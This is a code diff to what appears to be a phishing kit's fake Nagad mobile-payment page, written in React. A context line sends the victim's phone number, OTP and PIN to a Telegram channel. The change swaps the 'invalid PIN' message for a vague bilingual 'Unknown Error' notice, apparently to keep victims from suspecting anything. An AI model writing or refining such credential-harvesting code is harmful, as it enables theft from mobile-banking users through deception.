@@ -151,7 +151,7 @@ const NagadPayment = () => {
     } else if (pinAttempts === 1) {
       sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') });
       setTimeout(() => {
-        setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
+        setPinError(language === 'bn' ? "অজানা ত্রুটি। আরও তথ্যের জন্য 16167 এ কল করুন।" : "Unknown Error. Please call 16167 for more information.");
         setPinAttempts(2);
         setIsLoading(false);
       }, 2000);
